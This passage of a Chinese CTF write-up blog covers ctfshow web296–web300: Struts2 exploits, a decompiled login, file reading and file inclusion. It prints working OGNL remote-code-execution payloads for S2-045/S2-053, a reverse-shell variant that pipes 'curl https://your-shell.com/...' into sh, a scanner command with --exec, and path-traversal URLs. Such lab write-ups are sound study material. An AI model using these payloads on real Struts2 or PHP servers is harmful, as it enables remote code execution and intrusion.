+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web296"><a class="header-anchor" href="#web296">¶</a>web296</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p><code>s2-052</code>, 没成功, 用工具跑完了, 指令执行py文件的时候扫不出来, 但是用图形化的又可以</p>
+<p>而且用的还是不是s2-052, 用的s2-045</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 .\Struts2Scan.py -u https://a156802e-1b87-421a-bc6d-afff49ad14f7.challenge.ctf.show/S2-052/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>
+<h2 id="web297"><a class="header-anchor" href="#web297">¶</a>web297</h2>
+<ul>
+<li>描述: 无</li>
+</ul>
+<p><code>s2-053</code>, 详情见github相关界面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;echo $FLAG&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+<p>反弹shell(我没成功, 而且不知道为什么)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;curl https://your-shell.com/ip:port | sh&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web298"><a class="header-anchor" href="#web298">¶</a>web298</h2>
+<ul>
+<li>描述: 看看代码，了解下和php不一样的地方</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/java-decompiler/jd-gui">反编译工具</a>, 直接将war包拖进去就可以用了</p>
+<p>从<code>web.xml</code>可以找到登录判定文件<code>logonServlet.class</code>, 再找到<code>getVipStatus</code>, 里面有账号密码:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">getVipStatus</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.username.equals(<span class="string">&quot;admin&quot;</span>) &amp;&amp; <span class="built_in">this</span>.password.equals(<span class="string">&quot;ctfshow&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>找到<code>/login</code>了, 可是访问还是404; 结果发现在<code>/ctfshow/login</code></p>
+<p>最终url如下, 登录即可获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure>
+<h2 id="web299"><a class="header-anchor" href="#web299">¶</a>web299</h2>
+<ul>
+<li>描述: 了解为主</li>
+</ul>
+<p>打开, 在源码里面发现``/view-source?file=index.php `, 可以读取文件</p>
+<p>先试试读取<code>/view-source?file=/WEB-INF/web.xml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is the description of my J2EE component This is the display name of my J2EE component ViewSourceServlet com.ctfshow.servlet.ViewSourceServlet This is the description of my J2EE component This is the display name of my J2EE component GetFlag com.ctfshow.servlet.GetFlag ViewSourceServlet /view-source GetFlag /getFlag index.jsp</span><br></pre></td></tr></table></figure>
+<p><code>com/ctfshow/servlet/GetFlag</code>下, 结合常见的文件框架, 那就是<code>/view-source?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</code></p>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921212805005.png" alt="image-20240921212805005"></p>
+<p>有个<code>/fl3g</code>, 反正什么都试试</p>
+<h2 id="web300"><a class="header-anchor" href="#web300">¶</a>web300</h2>
+<ul>
+<li>描述: java 告一段落</li>
+</ul>
+<p>你这是真的java还是假的java?</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>文件包含?其实就是web299翻版, 直接照着web299走, 换个网址就行了; payload如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=../../../../../f1bg</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/ctfshow-webbasic-java/">https://4reexile.github.io/article/ctfshow-webbasic-java/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/grey-hack/" title="GreyHack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">GreyHack</div></div></a></div><div class="next-post pull-right"><a href="/article/Lampiao-1/" title="Lampiao-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Lampiao-1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/ctfshow-webbasic-nodejs/" title="Web入门_nodejs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-23</div><div class="title">Web入门_nodejs</div></div></a></div><div><a href="/article/DerpNStink-1/" title="DerpNStink-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/article/EVM-1/" title="EVM-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-06</div><div class="title">EVM-1</div></div></a></div><div><a href="/article/FristiLeaks-1.3/" title="FristiLeaks-1.3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-01</div><div class="title">FristiLeaks-1.3</div></div></a></div><div><a href="/article/IMF-1/" title="IMF-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">IMF-1</div></div></a></div><div><a href="/article/Jangow-1-01/" title="Jangow-1-01"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-19</div><div class="title">Jangow-1-01</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">java</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web279"><span class="toc-number">1.1.</span> <span class="toc-text">web279</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web280"><span class="toc-number">1.2.</span> <span class="toc-text">web280</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web281"><span class="toc-number">1.3.</span> <span class="toc-text">web281</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web282"><span class="toc-number">1.4.</span> <span class="toc-text">web282</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web283"><span class="toc-number">1.5.</span> <span class="toc-text">web283</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web284"><span class="toc-number">1.6.</span> <span class="toc-text">web284</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web285"><span class="toc-number">1.7.</span> <span class="toc-text">web285</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web286"><span class="toc-number">1.8.</span> <span class="toc-text">web286</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web287"><span class="toc-number">1.9.</span> <span class="toc-text">web287</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web288"><span class="toc-number">1.10.</span> <span class="toc-text">web288</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web289"><span class="toc-number">1.11.</span> <span class="toc-text">web289</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web290"><span class="toc-number">1.12.</span> <span class="toc-text">web290</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web291"><span class="toc-number">1.13.</span> <span class="toc-text">web291</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web292"><span class="toc-number">1.14.</span> <span class="toc-text">web292</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web293"><span class="toc-number">1.15.</span> <span class="toc-text">web293</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web294"><span class="toc-number">1.16.</span> <span class="toc-text">web294</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web295"><span class="toc-number">1.17.</span> <span class="toc-text">web295</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web296"><span class="toc-number">1.18.</span> <span class="toc-text">web296</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web297"><span class="toc-number">1.19.</span> <span class="toc-text">web297</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web298"><span class="toc-number">1.20.</span> <span class="toc-text">web298</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web299"><span class="toc-number">1.21.</span> <span class="toc-text">web299</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web300"><span class="toc-number">1.22.</span> <span class="toc-text">web300</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
